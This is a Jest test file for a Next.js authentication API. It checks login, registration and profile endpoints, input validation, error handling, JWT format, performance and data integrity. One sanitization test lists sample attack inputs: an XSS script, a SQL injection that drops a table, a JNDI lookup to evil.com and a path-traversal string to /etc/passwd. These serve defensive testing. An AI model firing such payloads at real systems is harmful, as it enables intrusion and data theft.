import { NextRequest } from 'next/server'
import { createMockRequest, createTestUser, cleanupTestData, setupTestEnvironment } from '../utils/test-helpers'
import { POST as loginHandler } from '@/app/api/auth/login/route'
import { POST as registerHandler } from '@/app/api/auth/register/route'
import { GET as profileHandler } from '@/app/api/auth/profile/route'

describe('System Health Checks and Validation Checkpoints', () => {
  beforeAll(async () => {
    await setupTestEnvironment()
  })

  afterAll(async () => {
    await cleanupTestData()
  })

  describe('Core System Components', () => {
    it('should validate database connectivity', async () => {
      // Test database connection through a simple operation
      const testUser = await createTestUser({
        username: 'dbtest',
        email: 'db@test.com',
        password: 'DbTest123!'
      })

      expect(testUser).toBeDefined()
      expect(testUser.id).toBeDefined()
      expect(testUser.email).toBe('db@test.com')
    })

    it('should validate authentication middleware functionality', async () => {
      // Create user and get token
      const testUser = await createTestUser({
        username: 'authtest',
        email: 'auth@test.com',
        password: 'AuthTest123!'
      })

      const loginRequest = createMockRequest('POST', '/api/auth/login', {
        email: testUser.email,
        password: 'AuthTest123!'
      })
      const loginResponse = await loginHandler(loginRequest)
      expect(loginResponse.status).toBe(200)

      const loginData = await loginResponse.json()
      const token = loginData.data.token
      expect(token).toBeDefined()

      // Test middleware with valid token
      const profileRequest = createMockRequest('GET', '/api/auth/profile', null, {
        'Authorization': `Bearer ${token}`
      })
      const profileResponse = await profileHandler(profileRequest)
      expect(profileResponse.status).toBe(200)

      // Test middleware with invalid token
      const invalidRequest = createMockRequest('GET', '/api/auth/profile', null, {
        'Authorization': 'Bearer invalid-token'
      })
      const invalidResponse = await profileHandler(invalidRequest)
      expect(invalidResponse.status).toBe(401)
    })

    it('should validate API response handler consistency', async () => {
      // Test success response format
      const loginRequest = createMockRequest('POST', '/api/auth/login', {
        email: 'nonexistent@test.com',
        password: 'WrongPassword123!'
      })
      const response = await loginHandler(loginRequest)
      
      const responseData = await response.json()
      
      // Validate response structure
      expect(responseData).toHaveProperty('success')
      expect(responseData).toHaveProperty('timestamp')
      expect(typeof responseData.success).toBe('boolean')
      expect(typeof responseData.timestamp).toBe('string')
      
      if (responseData.success) {
        expect(responseData).toHaveProperty('data')
      } else {
        expect(responseData).toHaveProperty('error')
        expect(responseData.error).toHaveProperty('message')
        expect(responseData.error).toHaveProperty('code')
      }
    })

    it('should validate input validation system', async () => {
      // Test with invalid data to ensure validation works
      const invalidRequests = [
        {
          name: 'missing email',
          data: { username: 'test', password: 'Test123!' }
        },
        {
          name: 'invalid email format',
          data: { username: 'test', email: 'invalid-email', password: 'Test123!' }
        },
        {
          name: 'weak password',
          data: { username: 'test', email: 'test@example.com', password: '123' }
        },
        {
          name: 'short username',
          data: { username: 'ab', email: 'test@example.com', password: 'Test123!' }
        }
      ]

      for (const { name, data } of invalidRequests) {
        const request = createMockRequest('POST', '/api/auth/register', data)
        const response = await registerHandler(request)
        
        expect(response.status).toBe(400)
        
        const responseData = await response.json()
        expect(responseData.success).toBe(false)
        expect(responseData.error).toBeDefined()
        
        console.log(`✓ Validation working for: ${name}`)
      }
    })

    it('should validate error handling system', async () => {
      // Test various error scenarios
      const errorScenarios = [
        {
          name: 'authentication failure',
          request: createMockRequest('POST', '/api/auth/login', {
            email: 'nonexistent@test.com',
            password: 'WrongPassword123!'
          }),
          expectedStatus: 401
        },
        {
          name: 'unauthorized access',
          request: createMockRequest('GET', '/api/auth/profile'),
          expectedStatus: 401
        },
        {
          name: 'validation error',
          request: createMockRequest('POST', '/api/auth/register', {
            username: 'ab',
            email: 'invalid',
            password: '123'
          }),
          expectedStatus: 400
        }
      ]

      for (const { name, request, expectedStatus } of errorScenarios) {
        let response: Response
        
        if (request.url.includes('/login')) {
          response = await loginHandler(request)
        } else if (request.url.includes('/profile')) {
          response = await profileHandler(request)
        } else if (request.url.includes('/register')) {
          response = await registerHandler(request)
        } else {
          throw new Error('Unknown endpoint')
        }
        
        expect(response.status).toBe(expectedStatus)
        
        const responseData = await response.json()
        expect(responseData.success).toBe(false)
        expect(responseData.error).toBeDefined()
        
        console.log(`✓ Error handling working for: ${name}`)
      }
    })
  })

  describe('Security Validation Checkpoints', () => {
    it('should validate password hashing is working', async () => {
      const testUser = await createTestUser({
        username: 'hashtest',
        email: 'hash@test.com',
        password: 'HashTest123!'
      })

      // Password should not be stored in plain text
      expect(testUser.password).not.toBe('HashTest123!')
      expect(testUser.password).toBeDefined()
      expect(testUser.password.length).toBeGreaterThan(20) // Hashed passwords are longer
    })

    it('should validate JWT token generation and verification', async () => {
      const testUser = await createTestUser({
        username: 'jwttest',
        email: 'jwt@test.com',
        password: 'JwtTest123!'
      })

      const loginRequest = createMockRequest('POST', '/api/auth/login', {
        email: testUser.email,
        password: 'JwtTest123!'
      })
      const loginResponse = await loginHandler(loginRequest)
      const loginData = await loginResponse.json()
      const token = loginData.data.token

      // Token should be a valid JWT format (3 parts separated by dots)
      const tokenParts = token.split('.')
      expect(tokenParts).toHaveLength(3)
      
      // Each part should be base64 encoded
      tokenParts.forEach(part => {
        expect(part).toMatch(/^[A-Za-z0-9_-]+$/)
      })

      // Token should work for authentication
      const profileRequest = createMockRequest('GET', '/api/auth/profile', null, {
        'Authorization': `Bearer ${token}`
      })
      const profileResponse = await profileHandler(profileRequest)
      expect(profileResponse.status).toBe(200)
    })

    it('should validate authorization header parsing', async () => {
      const testUser = await createTestUser({
        username: 'headertest',
        email: 'header@test.com',
        password: 'HeaderTest123!'
      })

      const loginRequest = createMockRequest('POST', '/api/auth/login', {
        email: testUser.email,
        password: 'HeaderTest123!'
      })
      const loginResponse = await loginHandler(loginRequest)
      const loginData = await loginResponse.json()
      const token = loginData.data.token

      // Test various authorization header formats
      const headerFormats = [
        `Bearer ${token}`,
        `bearer ${token}`, // Different case
        `BEARER ${token}` // All caps
      ]

      for (const authHeader of headerFormats) {
        const request = createMockRequest('GET', '/api/auth/profile', null, {
          'Authorization': authHeader
        })
        const response = await profileHandler(request)
        expect(response.status).toBe(200)
      }
    })

    it('should validate input sanitization', async () => {
      // Test that potentially dangerous inputs are handled safely
      const dangerousInputs = [
        '<script>alert("xss")</script>',
        '\'; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd'
      ]

      for (const dangerousInput of dangerousInputs) {
        const request = createMockRequest('POST', '/api/auth/register', {
          username: dangerousInput,
          email: 'danger@test.com',
          password: 'Danger123!'
        })
        
        const response = await registerHandler(request)
        
        // Should either reject the input or sanitize it
        expect([400, 409]).toContain(response.status)
        
        if (response.status === 409) {
          // If it was accepted, verify it was sanitized
          const responseData = await response.json()
          expect(responseData.error.message).not.toContain('<script>')
          expect(responseData.error.message).not.toContain('DROP TABLE')
        }
      }
    })
  })

  describe('Performance Validation Checkpoints', () => {
    it('should validate response times are within acceptable limits', async () => {
      const testUser = await createTestUser({
        username: 'perfcheck',
        email: 'perfcheck@test.com',
        password: 'PerfCheck123!'
      })

      // Test login performance
      const loginStart = Date.now()
      const loginRequest = createMockRequest('POST', '/api/auth/login', {
        email: testUser.email,
        password: 'PerfCheck123!'
      })
      const loginResponse = await loginHandler(loginRequest)
      const loginDuration = Date.now() - loginStart

      expect(loginResponse.status).toBe(200)
      expect(loginDuration).toBeLessThan(2000) // Should complete within 2 seconds

      const loginData = await loginResponse.json()
      const token = loginData.data.token

      // Test profile performance
      const profileStart = Date.now()
      const profileRequest = createMockRequest('GET', '/api/auth/profile', null, {
        'Authorization': `Bearer ${token}`
      })
      const profileResponse = await profileHandler(profileRequest)
      const profileDuration = Date.now() - profileStart

      expect(profileResponse.status).toBe(200)
      expect(profileDuration).toBeLessThan(1000) // Should complete within 1 second

      console.log(`Login: ${loginDuration}ms, Profile: ${profileDuration}ms`)
    })

    it('should validate memory usage is stable', async () => {
      const initialMemory = process.memoryUsage ? process.memoryUsage() : null

      // Perform multiple operations
      for (let i = 0; i < 50; i++) {
        const testUser = await createTestUser({
          username: `memtest${i}`,
          email: `memtest${i}@test.com`,
          password: 'MemTest123!'
        })

        const loginRequest = createMockRequest('POST', '/api/auth/login', {
          email: testUser.email,
          password: 'MemTest123!'
        })
        const loginResponse = await loginHandler(loginRequest)
        expect(loginResponse.status).toBe(200)
      }

      const finalMemory = process.memoryUsage ? process.memoryUsage() : null

      if (initialMemory && finalMemory) {
        const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed
        const memoryIncreasePercent = (memoryIncrease / initialMemory.heapUsed) * 100

        console.log(`Memory increase: ${(memoryIncrease / 1024 / 1024).toFixed(2)} MB (${memoryIncreasePercent.toFixed(2)}%)`);
        
        // Memory increase should be reasonable
        expect(memoryIncreasePercent).toBeLessThan(200)
      }
    })

    it('should validate concurrent request handling', async () => {
      const testUser = await createTestUser({
        username: 'concurrenttest',
        email: 'concurrent@test.com',
        password: 'Concurrent123!'
      })

      // Create multiple concurrent requests
      const concurrentRequests = 20
      const promises = Array.from({ length: concurrentRequests }, () => {
        const request = createMockRequest('POST', '/api/auth/login', {
          email: testUser.email,
          password: 'Concurrent123!'
        })
        return loginHandler(request)
      })

      const startTime = Date.now()
      const responses = await Promise.all(promises)
      const totalTime = Date.now() - startTime

      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200)
      })

      const throughput = (concurrentRequests / totalTime) * 1000
      console.log(`Concurrent throughput: ${throughput.toFixed(2)} req/sec`)
      
      // Should handle at least 5 requests per second
      expect(throughput).toBeGreaterThan(5)
    })
  })

  describe('Data Integrity Validation Checkpoints', () => {
    it('should validate user data consistency', async () => {
      const userData = {
        username: 'consistencytest',
        email: 'consistency@test.com',
        password: 'Consistency123!'
      }

      // Register user
      const registerRequest = createMockRequest('POST', '/api/auth/register', userData)
      const registerResponse = await registerHandler(registerRequest)
      expect(registerResponse.status).toBe(201)

      const registerData = await registerResponse.json()
      const registeredUser = registerData.data.user

      // Login and get profile
      const loginRequest = createMockRequest('POST', '/api/auth/login', {
        email: userData.email,
        password: userData.password
      })
      const loginResponse = await loginHandler(loginRequest)
      const loginData = await loginResponse.json()
      const token = loginData.data.token

      const profileRequest = createMockRequest('GET', '/api/auth/profile', null, {
        'Authorization': `Bearer ${token}`
      })
      const profileResponse = await profileHandler(profileRequest)
      const profileData = await profileResponse.json()
      const profileUser = profileData.data.user

      // Data should be consistent across operations
      expect(registeredUser.username).toBe(userData.username)
      expect(registeredUser.email).toBe(userData.email)
      expect(profileUser.username).toBe(userData.username)
      expect(profileUser.email).toBe(userData.email)
      expect(registeredUser.id).toBe(profileUser.id)

      // Sensitive data should not be exposed
      expect(registeredUser.password).toBeUndefined()
      expect(profileUser.password).toBeUndefined()
    })

    it('should validate duplicate prevention', async () => {
      const userData = {
        username: 'duplicatecheck',
        email: 'duplicatecheck@test.com',
        password: 'Duplicate123!'
      }

      // First registration should succeed
      const firstRequest = createMockRequest('POST', '/api/auth/register', userData)
      const firstResponse = await registerHandler(firstRequest)
      expect(firstResponse.status).toBe(201)

      // Second registration with same email should fail
      const secondRequest = createMockRequest('POST', '/api/auth/register', {
        ...userData,
        username: 'differentusername'
      })
      const secondResponse = await registerHandler(secondRequest)
      expect(secondResponse.status).toBe(409)

      // Third registration with same username should fail
      const thirdRequest = createMockRequest('POST', '/api/auth/register', {
        ...userData,
        email: 'different@test.com'
      })
      const thirdResponse = await registerHandler(thirdRequest)
      expect(thirdResponse.status).toBe(409)
    })
  })

  describe('System Stability Validation', () => {
    it('should validate system handles errors gracefully', async () => {
      // Test various error conditions don't crash the system
      const errorTests = [
        () => createMockRequest('POST', '/api/auth/login', null), // Null body
        () => createMockRequest('POST', '/api/auth/login', undefined), // Undefined body
        () => createMockRequest('POST', '/api/auth/login', 'invalid json'), // Invalid JSON
        () => createMockRequest('POST', '/api/auth/login', { malformed: true }) // Missing required fields
      ]

      for (const createErrorRequest of errorTests) {
        try {
          const request = createErrorRequest()
          const response = await loginHandler(request)
          
          // Should return an error response, not crash
          expect(response).toBeDefined()
          expect(response.status).toBeGreaterThanOrEqual(400)
          
          const responseData = await response.json()
          expect(responseData.success).toBe(false)
        } catch (error) {
          // If it throws, it should be a controlled error
          expect(error).toBeDefined()
        }
      }
    })

    it('should validate system recovery after errors', async () => {
      // Cause some errors
      for (let i = 0; i < 5; i++) {
        const errorRequest = createMockRequest('POST', '/api/auth/login', {
          email: 'invalid',
          password: 'invalid'
        })
        const errorResponse = await loginHandler(errorRequest)
        expect(errorResponse.status).toBe(400)
      }

      // System should still work normally after errors
      const testUser = await createTestUser({
        username: 'recoverytest',
        email: 'recovery@test.com',
        password: 'Recovery123!'
      })

      const normalRequest = createMockRequest('POST', '/api/auth/login', {
        email: testUser.email,
        password: 'Recovery123!'
      })
      const normalResponse = await loginHandler(normalRequest)
      expect(normalResponse.status).toBe(200)
    })
  })

  describe('Health Check Summary', () => {
    it('should provide overall system health status', async () => {
      const healthChecks = {
        database: false,
        authentication: false,
        validation: false,
        errorHandling: false,
        performance: false
      }

      try {
        // Database check
        const testUser = await createTestUser({
          username: 'healthcheck',
          email: 'health@test.com',
          password: 'Health123!'
        })
        healthChecks.database = !!testUser.id

        // Authentication check
        const loginRequest = createMockRequest('POST', '/api/auth/login', {
          email: testUser.email,
          password: 'Health123!'
        })
        const loginResponse = await loginHandler(loginRequest)
        healthChecks.authentication = loginResponse.status === 200

        // Validation check
        const invalidRequest = createMockRequest('POST', '/api/auth/register', {
          username: 'ab',
          email: 'invalid',
          password: '123'
        })
        const invalidResponse = await registerHandler(invalidRequest)
        healthChecks.validation = invalidResponse.status === 400

        // Error handling check
        const errorRequest = createMockRequest('GET', '/api/auth/profile')
        const errorResponse = await profileHandler(errorRequest)
        healthChecks.errorHandling = errorResponse.status === 401

        // Performance check
        const perfStart = Date.now()
        const perfRequest = createMockRequest('POST', '/api/auth/login', {
          email: testUser.email,
          password: 'Health123!'
        })
        const perfResponse = await loginHandler(perfRequest)
        const perfDuration = Date.now() - perfStart
        healthChecks.performance = perfResponse.status === 200 && perfDuration < 2000

      } catch (error) {
        console.error('Health check failed:', error)
      }

      // Report health status
      console.log('\n=== SYSTEM HEALTH CHECK RESULTS ===');
      Object.entries(healthChecks).forEach(([check, status]) => {
        console.log(`${check.toUpperCase()}: ${status ? '✅ HEALTHY' : '❌ UNHEALTHY'}`);
      })

      const healthyChecks = Object.values(healthChecks).filter(Boolean).length
      const totalChecks = Object.keys(healthChecks).length
      const healthPercentage = (healthyChecks / totalChecks) * 100

      console.log(`\nOVERALL HEALTH: ${healthPercentage.toFixed(1)}% (${healthyChecks}/${totalChecks})`);
      console.log('=====================================\n');

      // System should be at least 80% healthy
      expect(healthPercentage).toBeGreaterThanOrEqual(80)
    })
  })
})